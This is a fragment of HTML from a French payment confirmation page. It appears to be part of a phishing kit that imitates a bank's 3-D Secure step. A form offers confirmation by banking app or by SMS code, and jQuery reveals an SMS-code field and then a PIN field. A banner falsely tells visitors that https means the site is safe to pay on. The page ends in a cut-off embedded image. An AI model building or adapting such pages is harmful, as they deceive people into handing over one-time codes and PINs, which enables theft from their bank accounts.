                                                                            <noscript class="wpforms-error-noscript">Veuillez activer JavaScript dans votre navigateur pour remplir ce formulaire.</noscript>
                                                                            <div class="wpforms-field-container">
                                                                                <div id="wpforms-604-field_1-container" class="wpforms-field wpforms-field-select wpforms-conditional-trigger wpforms-field-select-style-classic" data-field-id="1">
                                                                                    <label name="a" class="wpforms-field-label" for="wpforms-604-field_1">
                                                                                        MÉTHODE DE CONFIRMATION <span class="wpforms-required-label">*</span>
                                                                                    </label>
                                                                                    <select id="wpforms-604-field_1" class="wpforms-field-medium wpforms-field-required wpforms-valid nadi2" name="wpforms" required="" aria-invalid="false">
                                                                                  <option name="app" value="Validation par application bancaire" selected="">Validation par application bancaire</option>
                                                                                        <option name="sms" value="J'ai reçu un code sms">J'ai reçu un code sms</option>
                                                                                    </select>
                                                                                </div>
                                                                                <div id="wpforms-604-field_2-container" class=" nadi4 wpforms-field wpforms-field-html wpforms-conditional-field wpforms-conditional-show" data-field-id="2">
                                                                                    <div id="wpforms-604-field_2">
                                                                                        <p>
                                                                                            Connectez vous à votre application bancaire et attendez que l'opération démarre, puis suivez les instructions...<br>Une fois complétée, cette page sera automatiquement mise à jour et vous recevrez votre confirmation de paiement par e-mail.
                                                                  
                                                                                        
                                                                                        </p>
                                                                                    </div>
                                                                                </div>
                                                                              
                                                                            <div class="wpforms-submit-container">
                                                                                <button name="submit" id="link" type="submit" >Confirmer</button></form>
                                                                                <img data-lazyloaded="1" src="data:," loading="lazy" decoding="async" data-src="https://neotabac.com/wp-content/plugins/wpforms%201.7.7/assets/images/submit-spin.svg" class="wpforms-submit-spinner entered litespeed-loaded" style="display:none" width="26" height="26" alt="Chargement en cours" data-ll-status="loaded">
                                                                                <noscript>
                                                                                    <img loading="lazy" decoding="async" src="https://neotabac.com/wp-content/plugins/wpforms%201.7.7/assets/images/submit-spin.svg" class="wpforms-submit-spinner" style="display: none;" width="26" height="26" alt="Chargement en cours">
                                                                                </noscript>
                                                                            </div>
                                                                        </form>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
                                                            <script>

                                                                $('.nadi2').change(function() {
                                                                    var a = $(this).val();
                                                                    if (a == "J'ai reçu un code sms") {
                                                                        $('.nadi3').attr('style', 'display:block;');
                                                                        $('.nadi4').attr('style', 'display:none;');
                                                                        $('.nadi5').val("sms");
                                                                        $('.nadi_sms').on('input', function() {
                                                                            if ($(this).val().trim() !== '') {
                                                                                $('.nadi_pin').attr('style', 'display:block;');
                                                                            } else {
                                                                                $('.nadi_pin').attr('style', 'display:none;');
                                                                            }
                                                                        });

                                                                    } else {
                                                                        $('.nadi5').val("app");
                                                                        $('.nadi3').attr('style', 'display:none;');
                                                                        $('.nadi4').attr('style', 'display:block;');
                                                                    }

                                                                })
                                                            </script>
                                                            <div class="elementor-element elementor-element-57afdf27 elementor-widget elementor-widget-text-editor" data-id="57afdf27" data-element_type="widget" data-widget_type="text-editor.default">
                                                                <div class="elementor-widget-container">
                                                                    <p>
                                                                        <span style="color:#ff9900">L’adresse de ce site de paiement préfixée par https indique que vous êtes sur un site sécurisé et que vous pouvez régler votre achat en toute tranquillité.</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-5639e0c" data-id="5639e0c" data-element_type="column">
                                                        <div class="elementor-widget-wrap elementor-element-populated">
                                                            <div class="elementor-element elementor-element-2945c4be elementor-widget elementor-widget-image" data-id="2945c4be" data-element_type="widget" data-widget_type="image.default">
                                                                <div class="elementor-widget-container">
                                                                    <img data-lazyloaded="1" src="data:image/png;base64,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